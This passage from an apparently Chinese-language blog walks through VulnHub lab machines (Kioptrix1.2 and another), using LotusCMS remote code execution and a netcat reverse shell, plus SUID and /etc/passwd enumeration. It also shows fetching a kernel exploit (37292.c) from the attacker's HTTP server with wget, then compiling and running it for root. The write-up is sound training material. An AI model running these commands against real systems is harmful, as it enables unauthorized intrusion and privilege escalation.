class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@simple:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux simple 3.16.0-30-generic <span class="hljs-comment">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 athlon i686 GNU/Linux</span><br>www-data@simple:/$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@simple:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@simple:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>sudo: 3 incorrect password attempts<br></code></pre></td></tr></table></figure><p>没收获，不过内核版本号和操作系统的信息拿到了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:103:107::/var/run/dbus:/bin/false<br>landscape:x:104:110::/var/lib/landscape:/bin/false<br>bull:x:1000:1000:bull,,,:/home/bull:/bin/bash<br>www-data@simple:/$ <span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span>: /etc/shadow: Permission denied<br></code></pre></td></tr></table></figure><p>shadow 中没有权限，试一试 home 目录中的用户的历史文件，也没有收获。试试 s 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/usr/share/mysql$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>278515  316 -rwsr-xr--   1 root     dip        323000 Nov 25  2014 /usr/sbin/pppd<br>278836   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Feb 12  2015 /usr/sbin/uuidd<br>280600   12 -rwsr-xr-x   1 root     root         9804 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>263326   12 -rwsr-xr-x   1 root     root         9612 Dec  4  2014 /usr/lib/pt_chown<br>278398  484 -rwsr-xr-x   1 root     root       492972 May 12  2014 /usr/lib/openssh/ssh-keysign<br>262362    8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>276259  328 -rwsr-xr--   1 root     messagebus   333952 Nov 25  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>262155   32 -rwsr-xr-x   1 root     root        30984 Feb 16  2014 /usr/bin/newgrp<br>262012   44 -rwsr-xr-x   1 root     root        44620 Feb 16  2014 /usr/bin/chfn<br>262015   36 -rwsr-xr-x   1 root     root        35916 Feb 16  2014 /usr/bin/chsh<br>262273  156 -rwsr-xr-x   1 root     root       156708 Feb 10  2014 /usr/bin/sudo<br>280595   20 -rwsr-xr-x   1 root     root        18168 Feb 11  2014 /usr/bin/pkexec<br>262086   68 -rwsr-xr-x   1 root     root        66252 Feb 16  2014 /usr/bin/gpasswd<br>278261   20 -rwsr-xr-x   1 root     root        18136 May  7  2014 /usr/bin/traceroute6.iputils<br>278345   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br>279461   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at<br>262167   48 -rwsr-xr-x   1 root     root        45420 Feb 16  2014 /usr/bin/passwd<br>277224   32 -rwsr-xr-x   1 root     root        30112 Dec 16  2013 /bin/fusermount<br>261725   36 -rwsr-xr-x   1 root     root        35300 Feb 16  2014 /bin/su<br>261706   44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6<br>261705   40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping<br>261692   88 -rwsr-xr-x   1 root     root        88752 Feb 12  2015 /bin/mount<br>261733   68 -rwsr-xr-x   1 root     root        67704 Feb 12  2015 /bin/umount<br></code></pre></td></tr></table></figure><p>依旧没收获，考虑内核提权</p><p><img src="/pic/8657b5b61e08fcbd3bc6584eb7a89c68_MD5.png"></p><p>本机 python 开启 http 服务，然后在 shell 中下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/tmp$ wget http://192.168.56.106:8088/37292.c<br>wget http://192.168.56.106:8088/37292.c<br>--2023-05-26 23:02:01--  http://192.168.56.106:8088/37292.c<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4968 (4.9K) [text/x-csrc]<br>Saving to: <span class="hljs-string">&#x27;37292.c&#x27;</span><br><br>100%[======================================&gt;] 4,968       --.-K/s   <span class="hljs-keyword">in</span> 0s      <br><br>2023-05-26 23:02:01 (1.06 GB/s) - <span class="hljs-string">&#x27;37292.c&#x27;</span> saved [4968/4968]<br><br></code></pre></td></tr></table></figure><p>尝试成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/tmp$ <span class="hljs-built_in">mv</span> 37292.c ofs.c<br><span class="hljs-built_in">mv</span> 37292.c ofs.c<br>www-data@simple:/tmp$ gcc ofs.c -o ofs<br>gcc ofs.c -o ofs<br>www-data@simple:/tmp$ ./ofs<br>./ofs<br>spawning threads<br>mount <span class="hljs-comment">#1</span><br>mount <span class="hljs-comment">#2</span><br>child threads <span class="hljs-keyword">done</span><br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>261842 drwx------  2 root root 4.0K Sep 21  2015 .<br>     2 drwxr-xr-x 21 root root 4.0K Sep  9  2015 ..<br>261843 -rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc<br>261844 -rw-r--r--  1 root root  140 Feb 19  2014 .profile<br>261852 -rw-------  1 root root   52 Sep 21  2015 flag.txt<br><span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>U wyn teh Interwebs!!1eleven11!!1!<br>Hack the planet!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kioptrix1.2靶机</title>
    <link href="/2023/05/3ec3f9289747.html"/>
    <url>/2023/05/3ec3f9289747.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>这台靶机主要涉及信息收集能力，漏洞利用 getshell 较为简单，提权也并不复杂，最花时间的是从最低权限的 shell 中收集有效信息的过程，其中有些是有效信息有些是无效信息，需要仔细鉴别，防止陷入兔子洞。</p></blockquote><h1 id="Kioptrix1-2靶机"><a href="#Kioptrix1-2靶机" class="headerlink" title="Kioptrix1.2靶机"></a>Kioptrix1.2靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/pic/b3da79520ae9ff6de6695923aa6dcf23_MD5.png" alt="image.png"></p><p><img src="/pic/4e9ce50884fb44ac035464d0f4d34982_MD5.png" alt="image.png"></p><h2 id="web查看"><a href="#web查看" class="headerlink" title="web查看"></a>web查看</h2><p>这里先按照vulhub上界面的提示，在hosts文件中加入了相应域名和ip的对应</p><p><img src="/pic/d1fa79d0ba30328788178518b55aafa4_MD5.png" alt="image.png"></p><p>查看主页面</p><p><img src="/pic/cf5b86be25aaf5b3fcce85198fb3d76d_MD5.png" alt="image.png"></p><p>这个界面中有三处可以跳转的地方，分别对应了blog、login和gallery</p><p><img src="/pic/772c6cc93937c1da1f82cfa6e30f6767_MD5.png" alt="image.png"></p><p><img src="/pic/ee81adf03081302459d0556f183bb7f0_MD5.png" alt="image.png"></p><p>这里得到了cms的名字LotusCMS</p><p><img src="/pic/5b1d5be81d07e1cfc65a7071c31ef53c_MD5.png" alt="image.png"></p><p>最有价值的信息就是cms的名字和登录界面</p><p>搜索一下这个cms的漏洞</p><p><img src="/pic/bf3eff94044b1731be09aaa7ea8a4d11_MD5.png" alt="image.png"></p><p>第一个脚本是通过msf利用的，试一下</p><p><img src="/pic/d5418d317d6c37762ee28c7d52951a4a_MD5.png" alt="image.png"></p><p>失败了，去谷歌吧</p><p><img src="/pic/3d46125818ee5890708186bcff5628ca_MD5.png" alt="image.png"></p><p>确实是有这个cms的利用方式的，而且根据靶机的时间判断，应该对应这个漏洞</p><p><img src="/pic/90dff3701f24f0c24f8478494eeb2107_MD5.png" alt="image.png"></p><p>给了两个文件还有对应的demo视频</p><p>那就把sh文件下载下来，然后运行试试，这里只列出文件开头给出的使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh target lotusCMS-path</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh ki0ptrix3.com /</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Enter IP and PORT when asked to spawn netcat based reverse shell ;)</span><br></code></pre></td></tr></table></figure><p><img src="/pic/0e80c0cf7586e1e96be9943229b616fc_MD5.png" alt="image.png"></p><p>刚开始尝试直接输入<code>NetCat /dev/tcp</code>但是始终没有反应，看了视频才发现，这里原来是输序号的……</p><p>反弹shell成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443            <br>[sudo] password for kali: <br>listening on [any] 443 ...<br>connect to [192.168.25.128] from (UNKNOWN) [192.168.25.130] 36437<br>whoami<br>www-data<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>来一波信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    link/ether 00:0c:29:82:a5:78 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.25.130/24 brd 192.168.25.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe82:a578/64 scope link <br>       valid_lft forever preferred_lft forever<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/bin/sh<br>man:x:6:12:man:/var/cache/man:/bin/sh<br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>mail:x:8:8:mail:/var/mail:/bin/sh<br>news:x:9:9:news:/var/spool/news:/bin/sh<br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:13:13:proxy:/bin:/bin/sh<br>www-data:x:33:33:www-data:/var/www:/bin/sh<br>backup:x:34:34:backup:/var/backups:/bin/sh<br>list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>dhcp:x:101:102::/nonexistent:/bin/false<br>syslog:x:102:103::/home/syslog:/bin/false<br>klog:x:103:104::/home/klog:/bin/false<br>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash<br>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ uname -a<br>uname -a<br>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$<br></code></pre></td></tr></table></figure><p>有个特殊的文件 ht</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>&lt;w/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null                <br> 66011    8 -rwsr-xr-x   1 root     root         4588 Aug 22  2008 /usr/lib/eject/dmcrypt-get-device<br> 90114  172 -rwsr-xr-x   1 root     root       168340 May 14  2008 /usr/lib/openssh/ssh-keysign<br> 90491   12 -rwsr-xr--   1 root     www-data    10276 Jun 18  2009 /usr/lib/apache2/suexec<br> 54187   12 -rwsr-xr-x   1 root     root         9624 Jan 11  2011 /usr/lib/pt_chown<br> 53422   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping<br> 53651   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr<br> 50857   20 -rwsr-xr-x   1 root     root        19144 Dec  8  2008 /usr/bin/newgrp<br> 51026   28 -rwsr-xr-x   1 root     root        28624 Dec  8  2008 /usr/bin/chfn<br> 51029   40 -rwsr-xr-x   1 root     root        37360 Dec  8  2008 /usr/bin/gpasswd<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudo<br> 53212   40 -rwsr-sr-x   1 daemon   daemon      38464 Feb 20  2007 /usr/bin/at<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudoedit<br> 51027   24 -rwsr-xr-x   1 root     root        23952 Dec  8  2008 /usr/bin/chsh<br> 51030   32 -rwsr-xr-x   1 root     root        29104 Dec  8  2008 /usr/bin/passwd<br> 53424   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils<br> 58472 2028 -rwsr-sr-x   1 root     root      2072344 Apr 16  2011 /usr/local/bin/ht<br> 53710  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd<br> 52260   16 -rwsr-sr-x   1 libuuid  libuuid     12336 Mar 27  2008 /usr/sbin/uuidd<br>582147    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script<br>196704   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount<br>196667   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping<br>196644   84 -rwsr-xr-x   1 root     root        81368 Sep 26  2008 /bin/mount<br>196645   68 -rwsr-xr-x   1 root     root        63584 Sep 26  2008 /bin/umount<br>196668   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6<br>196641   28 -rwsr-xr-x   1 root     root        25540 Dec  8  2008 /bin/su<br></code></pre></td></tr></table></figure><p>找了一圈没发现ht的suid的利用方法，接着信息收集吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/crontab<br>cat /etc/crontab<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta prompt_">#</span><br></code></pre></td></tr></table></figure><p>定时任务里没收获，四处走走看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ ls -liah<br>ls -liah<br>total 36K<br>631216 drwxrwxrwx  8 root root 4.0K Apr 14  2011 .<br>630792 drwxr-xr-x  8 root root 4.0K Apr 15  2011 ..<br>631217 -rwxrwxrwx  1 root root   13 Apr  1  2006 .htaccess<br>631218 drwxrwxrwx  3 root root 4.0K Apr 14  2011 config<br>631229 drwxrwxrwx  2 root root 4.0K Apr 14  2011 filebackups<br>631231 drwxrwxrwx  2 root root 4.0K Apr 14  2011 files<br>631233 -rwxrwxrwx  1 root root    0 Apr 11  2010 index.php<br>631234 drwxrwxrwx 10 root root 4.0K Apr 14  2011 modules<br>631266 drwxrwxrwx  2 root root 4.0K Apr 14  2011 pages<br>631269 drwxrwxrwx  2 root root 4.0K Apr 14  2011 users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd config<br>cd config<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls -liah<br>ls -liah<br>total 36K<br>631218 drwxrwxrwx 3 root root 4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root root 4.0K Apr 14  2011 ..<br>631219 -rwxrwxrwx 1 root root    4 Oct  2  2010 active_design.dat<br>631220 -rwxrwxrwx 1 root root    0 Apr 11  2010 index.php<br>631221 drwxrwxrwx 2 root root 4.0K Apr 14  2011 modules<br>631224 -rwxrwxrwx 1 root root   30 Apr 14  2011 salt.dat<br>631225 -rwxrwxrwx 1 root root   21 Oct  2  2010 site_description.dat<br>631226 -rwxrwxrwx 1 root root    8 Oct  2  2010 site_keywords.dat<br>631227 -rwxrwxrwx 1 root root   15 Apr 14  2011 site_title.dat<br>631228 -rwxrwxrwx 1 root root    5 Mar 14  2011 site_version.dat<br></code></pre></td></tr></table></figure><p>有一些有意思的文件，挨个看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls<br>ls<br>active_design.dat  modules   site_description.dat  site_title.dat<br>index.php          salt.dat  site_keywords.dat     site_version.dat<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat salt.dat<br>cat salt.dat<br>gtZBO2PewhZHR10hGXLaSt0Bc5Ub73<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_description.dat<br>&lt;w/kioptrix3.com/data/config$ cat site_description.dat                       <br>Your Site Description<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_keywords.dat<br>cat site_keywords.dat<br>LotusCMS<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat active_design.dat<br>cat active_design.dat<br>grey<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_version.dat<br>cat site_version.dat<br>3.0.5<br></code></pre></td></tr></table></figure><p>一是确定了LotusCMS的版本（都已经打进来了，版本号也没什么用了），二是拿到了salt，或许之后用得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd users<br>cd users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ ls -liah<br>ls -liah<br>total 12K<br>631269 drwxrwxrwx 2 root     root     4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root     root     4.0K Apr 14  2011 ..<br>631270 -rw-r--r-- 1 www-data www-data   67 Apr 15  2011 